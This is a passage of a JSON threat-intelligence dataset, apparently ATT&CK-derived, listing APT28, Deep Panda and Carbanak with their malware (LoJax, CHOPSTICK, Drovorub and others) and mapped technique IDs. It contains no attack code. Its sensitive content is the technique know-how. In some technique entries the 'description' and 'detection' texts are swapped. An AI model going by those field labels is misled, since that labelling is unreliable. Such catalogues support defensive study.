                    "T1518.001": "Security Software Discovery",
                    "T1087.001": "Local Account",
                    "T1560.002": "Archive via Library",
                    "T1560": "Archive Collected Data",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1055.011": "Extra Window Memory Injection",
                    "T1124": "System Time Discovery",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 21
        },
        {
            "id": "S0022",
            "type": "tool",
            "attributes": {
                "name": "Uroburos",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Uroburos is a rootkit used by Turla.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1027.002": "Software Packing",
                    "T1014": "Rootkit"
                }
            },
            "val": 2
        },
        {
            "id": "G0009",
            "type": "group",
            "attributes": {
                "val": 7,
                "name": "Deep Panda",
                "aliases": [
                    "Shell Crew",
                    "WebMasters",
                    "KungFu Kittens",
                    "PinkPanther",
                    "Black Vine"
                ],
                "description": "Deep Panda is a suspected Chinese threat group known to target many industries, including government, defense, financial, and telecommunications.  The intrusion into healthcare company Anthem has been attributed to Deep Panda.  This group is also known as Shell Crew, WebMasters, KungFu Kittens, and PinkPanther.  Deep Panda also appears to be known as Black Vine based on the attribution of both group names to the Anthem intrusion.  Some analysts track Deep Panda and APT19 as the same group, but it is unclear from open source information if the groups are the same.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0142": "StreamEx",
                    "S0097": "Ping",
                    "S0080": "Mivast",
                    "S0074": "Sakula",
                    "S0057": "Tasklist",
                    "S0039": "Net",
                    "S0021": "Derusbi"
                },
                "techniques": {
                    "T1027.005": "Indicator Removal from Tools",
                    "T1564.003": "Hidden Window",
                    "T1059.001": "PowerShell",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1546.008": "Accessibility Features",
                    "T1218.010": "Regsvr32",
                    "T1505.003": "Web Shell",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1018": "Remote System Discovery"
                }
            }
        },
        {
            "id": "S0142",
            "type": "tool",
            "attributes": {
                "name": "StreamEx",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "StreamEx is a malware family that has been used by Deep Panda since at least 2015. In 2016, it was distributed via legitimate compromised Korean websites.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1518.001": "Security Software Discovery",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1112": "Modify Registry",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 9
        },
        {
            "id": "S0080",
            "type": "tool",
            "attributes": {
                "name": "Mivast",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Mivast is a backdoor that has been used by Deep Panda. It was reportedly used in the Anthem breach.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1003.002": "Security Account Manager",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 5
        },
        {
            "id": "S0074",
            "type": "tool",
            "attributes": {
                "name": "Sakula",
                "aliases": [
                    "Sakurel",
                    "VIPER"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Sakula is a remote access tool (RAT) that first surfaced in 2012 and was used in intrusions throughout 2015.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1574.002": "DLL Side-Loading",
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1105": "Ingress Tool Transfer",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 11
        },
        {
            "id": "G0008",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Carbanak",
                "aliases": [
                    "Anunak",
                    "Carbon Spider"
                ],
                "description": "Carbanak is a threat group that mainly targets banks. It also refers to malware of the same name (Carbanak). It is sometimes referred to as FIN7, but these appear to be two groups using the same Carbanak malware and are therefore tracked separately.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0108": "netsh",
                    "S0030": "Carbanak",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1102.002": "Bidirectional Communication",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1219": "Remote Access Software",
                    "T1078": "Valid Accounts",
                    "T1008": "Fallback Channels"
                }
            }
        },
        {
            "id": "G0007",
            "type": "group",
            "attributes": {
                "val": 24,
                "name": "APT28",
                "aliases": [
                    "SNAKEMACKEREL",
                    "Swallowtail",
                    "Group 74",
                    "Sednit",
                    "Sofacy",
                    "Pawn Storm",
                    "Fancy Bear",
                    "STRONTIUM",
                    "Tsar Team",
                    "Threat Group-4127",
                    "TG-4127"
                ],
                "description": "APT28 is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165. This group has been active since at least 2004.          \n\nAPT28 reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election.  In 2018, the US indicted five GRU Unit 26165 officers associated with APT28 for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations. Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as Sandworm Team.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0502": "Drovorub",
                    "S0410": "Fysbis",
                    "S0397": "LoJax",
                    "S0351": "Cannon",
                    "S0251": "Zebrocy",
                    "S0250": "Koadic",
                    "S0243": "DealersChoice",
                    "S0193": "Forfiles",
                    "S0191": "Winexe",
                    "S0174": "Responder",
                    "S0161": "XAgentOSX",
                    "S0160": "certutil",
                    "S0162": "Komplex",
                    "S0138": "OLDBAIT",
                    "S0137": "CORESHELL",
                    "S0136": "USBStealer",
                    "S0135": "HIDEDRV",
                    "S0134": "Downdelph",
                    "S0117": "XTunnel",
                    "S0045": "ADVSTORESHELL",
                    "S0044": "JHUHUGIT",
                    "S0023": "CHOPSTICK",
                    "S0002": "Mimikatz",
                    "S0314": "X-Agent for Android"
                },
                "techniques": {
                    "T1598": "Phishing for Information",
                    "T1595.002": "Vulnerability Scanning",
                    "T1589.001": "Credentials",
                    "T1583.001": "Domains",
                    "T1573.001": "Symmetric Cryptography",
                    "T1546.015": "Component Object Model Hijacking",
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1001.001": "Junk Data",
                    "T1090.003": "Multi-hop Proxy",
                    "T1090.002": "External Proxy",
                    "T1102.002": "Bidirectional Communication",
                    "T1074.001": "Local Data Staging",
                    "T1564.003": "Hidden Window",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1567": "Exfiltration Over Web Service",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1564.001": "Hidden Files and Directories",
                    "T1560": "Archive Collected Data",
                    "T1114.002": "Remote Email Collection",
                    "T1134.001": "Token Impersonation/Theft",
                    "T1213.002": "Sharepoint",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1056.001": "Keylogging",
                    "T1003.001": "LSASS Memory",
                    "T1110.003": "Password Spraying",
                    "T1110.001": "Password Guessing",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1550.001": "Application Access Token",
                    "T1550.002": "Pass the Hash",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1037.001": "Logon Script (Windows)",
                    "T1542.003": "Bootkit",
                    "T1137.002": "Office Test",
                    "T1528": "Steal Application Access Token",
                    "T1498": "Network Denial of Service",
                    "T1221": "Template Injection",
                    "T1190": "Exploit Public-Facing Application",
                    "T1210": "Exploitation of Remote Services",
                    "T1211": "Exploitation for Defense Evasion",
                    "T1203": "Exploitation for Client Execution",
                    "T1199": "Trusted Relationship",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1120": "Peripheral Device Discovery",
                    "T1119": "Automated Collection",
                    "T1113": "Screen Capture",
                    "T1110": "Brute Force",
                    "T1105": "Ingress Tool Transfer",
                    "T1092": "Communication Through Removable Media",
                    "T1091": "Replication Through Removable Media",
                    "T1083": "File and Directory Discovery",
                    "T1078": "Valid Accounts",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1040": "Network Sniffing",
                    "T1027": "Obfuscated Files or Information",
                    "T1025": "Data from Removable Media",
                    "T1014": "Rootkit",
                    "T1005": "Data from Local System",
                    "T1003": "OS Credential Dumping",
                    "T1346": "Obtain/re-use payloads",
                    "T1328": "Buy domain name"
                }
            }
        },
        {
            "id": "T1547.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Kernel Modules and Extensions",
                "chain_phase": "persistence",
                "description": "Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands:<code>modprobe</code>, <code>insmod</code>, <code>lsmod</code>, <code>rmmod</code>, or <code>modinfo</code> (Citation: Linux Loadable Kernel Module Insert and Remove LKMs) LKMs are typically loaded into <code>/lib/modules</code> and have had the extension .ko (\"kernel object\") since version 2.6 of the Linux kernel. (Citation: Wikipedia Loadable Kernel Module)\n\nFor macOS, monitor for execution of <code>kextload</code> commands and correlate with other unknown or suspicious activity.\n\nAdversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. (Citation: iDefense Rootkit Overview) Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.(Citation: Trend Micro Skidmap) Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)</code> On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)</code>",
                "detection": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.  \n\nWhen used maliciously, LKMs can be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0).  Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. \n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Since macOS Catalina 10.15, kernel extensions have been deprecated on macOS systems.\n\nAdversaries can use LKMs and kexts to covertly persist on a system and elevate privileges. Examples have been found in the wild and there are some open source projects.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "S0502",
            "type": "tool",
            "attributes": {
                "name": "Drovorub",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Drovorub is a Linux malware toolset comprised of an agent, client, server, and kernel modules, that has been used by APT28.",
                "platforms": [
                    "Linux"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1090.001": "Internal Proxy",
                    "T1059.004": "Unix Shell",
                    "T1070.004": "File Deletion",
                    "T1547.006": "Kernel Modules and Extensions",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1095": "Non-Application Layer Protocol",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1027": "Obfuscated Files or Information",
                    "T1014": "Rootkit",
                    "T1005": "Data from Local System"
                }
            },
            "val": 12
        },
        {
            "id": "S0410",
            "type": "tool",
            "attributes": {
                "name": "Fysbis",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Fysbis is a Linux-based backdoor used by APT28 that dates back to at least 2014.",
                "platforms": [
                    "Linux"
                ],
                "techniques": {
                    "T1132.001": "Standard Encoding",
                    "T1059.004": "Unix Shell",
                    "T1056.001": "Keylogging",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1070.004": "File Deletion",
                    "T1543.002": "Systemd Service",
                    "T1547.013": "XDG Autostart Entries",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 13
        },
        {
            "id": "T1542.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Firmware",
                "chain_phase": "persistence",
                "description": "System firmware manipulation may be detected. (Citation: MITRE Trustworthy Firmware Measurement) Dump and inspect BIOS images on vulnerable systems and compare against known good images. (Citation: MITRE Copernicus) Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.\n\nLikewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. (Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit)",
                "detection": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.   \n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1019",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Firmware",
                "chain_phase": null,
                "description": [],
                "detection": "No Description Available Yet",
                "is_subtype": false,
                "platforms": []
            }
        },
        {
            "id": "S0397",
            "type": "tool",
            "attributes": {
                "name": "LoJax",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "LoJax is a UEFI rootkit used by APT28 to persist remote access software on targeted systems.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1564.004": "NTFS File Attributes",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1542.001": "System Firmware",
                    "T1112": "Modify Registry",
                    "T1019": "System Firmware",
                    "T1014": "Rootkit"
                }
            },
            "val": 6
        },
        {
            "id": "S0351",
            "type": "tool",
            "attributes": {
                "name": "Cannon",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Cannon is a Trojan with variants written in C# and Delphi. It was first observed in April 2018.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.003": "Mail Protocols",
                    "T1547.004": "Winlogon Helper DLL",
                    "T1124": "System Time Discovery",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 11
        },
        {
            "id": "S0251",
            "type": "tool",
            "attributes": {
                "name": "Zebrocy",
                "aliases": [
                    "Zekapab"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Zebrocy is a Trojan that has been used by APT28 since at least November 2015. The malware comes in several programming language variants, including C++, Delphi, AutoIt, C#, VB.NET, and Golang.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1074.001": "Local Data Staging",
                    "T1059.003": "Windows Command Shell",
                    "T1560": "Archive Collected Data",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.004": "Credential API Hooking",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1037.001": "Logon Script (Windows)",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1135": "Network Share Discovery",
                    "T1124": "System Time Discovery",
                    "T1120": "Peripheral Device Discovery",
                    "T1119": "Automated Collection",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry"
                }
            },
            "val": 32
        },
        {
            "id": "S0243",
            "type": "tool",
            "attributes": {
                "name": "DealersChoice",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "DealersChoice is a Flash exploitation framework used by APT28.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1203": "Exploitation for Client Execution"
                }
            },
            "val": 3
        },
        {
            "id": "S0193",
            "type": "tool",
            "attributes": {
                "name": "Forfiles",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Forfiles is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1202": "Indirect Command Execution",
                    "T1083": "File and Directory Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 3
        },
        {
            "id": "S0174",
            "type": "tool",
            "attributes": {
                "name": "Responder",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Responder is an open source tool used for LLMNR, NBT-NS and MDNS poisoning, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1557.001": "LLMNR/NBT-NS Poisoning and SMB Relay",
                    "T1040": "Network Sniffing"
                }
            },
            "val": 2
        },
        {
            "id": "S0161",
            "type": "tool",
            "attributes": {
                "name": "XAgentOSX",
                "aliases": [
                    "OSX.Sofacy"
                ],
                "labels": [
                    "malware"
                ],
                "description": "XAgentOSX is a trojan that has been used by APT28  on OS X and appears to be a port of their standard CHOPSTICK or XAgent trojan.",
                "platforms": [
                    "macOS"
                ],
                "techniques": {
                    "T1071.002": "File Transfer Protocols",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1070.004": "File Deletion",
                    "T1113": "Screen Capture",
                    "T1106": "Native API",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 10
        },
        {
            "id": "S0162",
            "type": "tool",
            "attributes": {
                "name": "Komplex",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Komplex is a backdoor that has been used by APT28 on OS X and appears to be developed in a similar manner to XAgentOSX  .",
                "platforms": [
                    "macOS"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1564.001": "Hidden Files and Directories",
                    "T1070.004": "File Deletion",
                    "T1543.001": "Launch Agent",
                    "T1057": "Process Discovery",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 7
        },
        {
            "id": "S0138",
            "type": "tool",
            "attributes": {
                "name": "OLDBAIT",
                "aliases": [
                    "Sasfis"
                ],
                "labels": [
                    "malware"
                ],
                "description": "OLDBAIT is a credential harvester used by APT28.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1555": "Credentials from Password Stores",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 6
        },
        {
            "id": "S0137",
            "type": "tool",
            "attributes": {
                "name": "CORESHELL",
                "aliases": [
                    "Sofacy",
                    "SOURFACE"
                ],
                "labels": [
                    "malware"
                ],
                "description": "CORESHELL is a downloader used by APT28. The older versions of this malware are known as SOURFACE and newer versions as CORESHELL.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1027.001": "Binary Padding",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 10
        },
        {
            "id": "T1092",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Communication Through Removable Media",
                "chain_phase": "command-and-control",
                "description": "Monitor file access on removable media. Detect processes that execute when removable media is mounted.",
                "detection": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by Replication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0136",
            "type": "tool",
            "attributes": {
                "name": "USBStealer",
                "aliases": [
                    "USB Stealer",
                    "Win32/USBStealer"
                ],
                "labels": [
                    "malware"
                ],
                "description": "USBStealer is malware that has used by APT28 since at least 2005 to extract information from air-gapped networks. It does not have the capability to communicate over the Internet and has been used in conjunction with ADVSTORESHELL.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1052.001": "Exfiltration over USB",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.006": "Timestomp",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1120": "Peripheral Device Discovery",
                    "T1119": "Automated Collection",
                    "T1092": "Communication Through Removable Media",
                    "T1091": "Replication Through Removable Media",
                    "T1083": "File and Directory Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1025": "Data from Removable Media",
                    "T1020": "Automated Exfiltration"
                }
            },
            "val": 14
        },
        {
            "id": "S0135",
            "type": "tool",
            "attributes": {
                "name": "HIDEDRV",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HIDEDRV is a rootkit used by APT28. It has been deployed along with Downdelph to execute and hide that malware.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1014": "Rootkit"
                }
            },
            "val": 2
        },
        {
            "id": "S0134",
            "type": "tool",
            "attributes": {
                "name": "Downdelph",
                "aliases": [
                    "Delphacy"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Downdelph is a first-stage downloader written in Delphi that has been used by APT28 in rare instances between 2013 and 2015.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1001.001": "Junk Data",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1548.002": "Bypass User Account Control",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 5
        },
        {
            "id": "S0117",
            "type": "tool",
            "attributes": {
                "name": "XTunnel",
                "aliases": [
                    "Trojan.Shunnael",
                    "X-Tunnel",
                    "XAPS"
                ],
                "labels": [
                    "malware"
                ],
                "description": "XTunnel a VPN-like network proxy tool that can relay traffic between a C2 server and a victim. It was first seen in May 2013 and reportedly used by APT28 during the compromise of the Democratic National Committee.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1059.003": "Windows Command Shell",
                    "T1027.001": "Binary Padding",
                    "T1552.001": "Credentials In Files",
                    "T1090": "Proxy",
                    "T1046": "Network Service Scanning",
                    "T1027": "Obfuscated Files or Information",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 8
        },
        {
            "id": "S0045",
            "type": "tool",
            "attributes": {
                "name": "ADVSTORESHELL",
                "aliases": [
                    "AZZY",
                    "EVILTOSS",
                    "NETUI",
                    "Sedreco"
                ],
                "labels": [
                    "malware"
                ],
                "description": "ADVSTORESHELL is a spying backdoor that has been used by APT28 from at least 2012 to 2016. It is generally used for long-term espionage and is deployed on targets deemed interesting after a reconnaissance phase.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1573.001": "Symmetric Cryptography",
                    "T1546.015": "Component Object Model Hijacking",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1074.001": "Local Data Staging",
                    "T1059.003": "Windows Command Shell",
                    "T1560.003": "Archive via Custom Method",
                    "T1560": "Archive Collected Data",
                    "T1056.001": "Keylogging",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1120": "Peripheral Device Discovery",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1029": "Scheduled Transfer",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry"
                }
            },
            "val": 24
        },
        {
            "id": "S0044",
            "type": "tool",
            "attributes": {
                "name": "JHUHUGIT",
                "aliases": [
                    "Trojan.Sofacy",
                    "Seduploader",
                    "JKEYSKW",
                    "Sednit",
                    "GAMEFISH",
                    "SofacyCarberp"
                ],
                "labels": [
                    "malware"
                ],
                "description": "JHUHUGIT is malware used by APT28. It is based on Carberp source code and serves as reconnaissance malware.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1546.015": "Component Object Model Hijacking",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1037.001": "Logon Script (Windows)",
                    "T1053.005": "Scheduled Task",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 20
        },
        {
            "id": "S0023",
            "type": "tool",
            "attributes": {
                "name": "CHOPSTICK",
                "aliases": [
                    "Backdoor.SofacyX",
                    "SPLM",
                    "Xagent",
                    "X-Agent",
                    "webhp"
                ],
                "labels": [
                    "malware"
                ],
                "description": "CHOPSTICK is a malware family of modular backdoors used by APT28. It has been used since at least 2012 and is usually dropped on victims as second-stage malware, though it has been used as first-stage malware in several cases. It has both Windows and Linux variants.     It is tracked separately from the X-Agent for Android.",
                "platforms": [
                    "Windows",
                    "Linux"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1090.001": "Internal Proxy",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1518.001": "Security Software Discovery",
                    "T1056.001": "Keylogging",
                    "T1497": "Virtualization/Sandbox Evasion",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1092": "Communication Through Removable Media",
                    "T1091": "Replication Through Removable Media",
                    "T1083": "File and Directory Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1012": "Query Registry",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 18
        },
        {
            "id": "S0314",
            "type": "tool",
            "attributes": {
                "name": "X-Agent for Android",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "X-Agent for Android is Android malware that was placed in a repackaged version of a Ukrainian artillery targeting application. The malware reportedly retrieved general location data on where the victim device was used, and therefore could likely indicate the potential location of Ukrainian artillery.  Is it tracked separately from the CHOPSTICK.",
                "platforms": [
                    "Android"
                ],
                "techniques": {
                    "T1444": "Masquerade as Legitimate Application",
                    "T1430": "Location Tracking"
                }
            },
            "val": 2
        },
        {
